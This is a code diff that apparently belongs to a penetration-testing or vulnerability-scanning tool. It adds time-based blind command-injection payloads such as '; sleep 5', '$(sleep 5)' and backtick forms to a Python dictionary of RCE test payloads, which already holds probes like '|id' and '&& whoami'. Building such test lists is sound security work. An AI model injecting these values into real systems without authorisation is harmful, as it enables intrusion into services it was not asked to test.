@@ -117,12 +117,22 @@ RCE_PAYLOADS: dict[str, list[dict]] = {
         {"payload": "| whoami", "desc": "管道"},
         {"payload": "&& dir C:\\", "desc": "AND 链+dir"},
     ],
+    "time_blind": [
+        {"payload": "; sleep 5", "desc": "分号+sleep时间盲注"},
+        {"payload": "| sleep 5", "desc": "管道+sleep"},
+        {"payload": "$(sleep 5)", "desc": "命令替换+sleep"},
+        {"payload": "`sleep 5`", "desc": "反引号+sleep"},
+        {"payload": "&& sleep 5", "desc": "链式+sleep"},
+        {"payload": "|| sleep 5", "desc": "OR链+sleep"},
+    ],
     "quick_scan": [
         {"payload": ";id", "desc": "Linux id"},
         {"payload": "|id", "desc": "Linux pipe"},
         {"payload": "$(id)", "desc": "命令替换"},
         {"payload": "`id`", "desc": "反引号"},
         {"payload": "&& whoami", "desc": "链式 whoami"},
+        {"payload": "; sleep 5", "desc": "时间盲注-分号"},
+        {"payload": "| sleep 5", "desc": "时间盲注-管道"},
     ],
 }
 
